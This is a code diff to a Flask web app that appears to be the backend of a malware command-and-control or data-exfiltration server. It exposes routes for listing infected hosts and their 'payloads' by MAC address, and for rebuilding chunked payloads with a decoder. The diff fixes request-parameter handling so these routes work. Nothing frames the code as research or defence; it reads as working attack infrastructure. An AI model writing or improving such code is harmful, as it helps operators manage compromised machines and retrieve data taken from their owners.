@@ -16,6 +16,7 @@ def parent_chain(path, n):
 sys.path.insert(1, parent_chain(FILEPATH, 2))
 
 from lib.database import Database
+from lib.data_decoder import Decoder
 
 # Flask app
 app = Flask(__name__)
@@ -33,14 +34,17 @@ def get_infected_hosts():
 
 @app.route('/get_payloads', methods=['GET'])
 def get_payloads():
-    mac_address = request.get('mac_address')
+    mac_address = request.args.get('mac_address')
     data = database.get_all_payload_names(mac_address)
     return json.dumps([{
         'payload_id': entry[0],
         'name': entry[1]
     } for entry in data])
 
-@app.route('/get_download_link', methods=['GET'])
+@app.route('/get_payload', methods=['GET'])
 def get_download_link():
-    mac_address = request.get('mac_address')
-    payload_id = request.get('payload_id')
+    mac_address = request.args.get('mac_address')
+    payload_id = request.args.get('payload_id')
+    payloads = database.get_payload_chunks(mac_address, payload_id)
+    reconstructed_payload = Decoder.reconstruct_data(payloads)
+    return reconstructed_payload
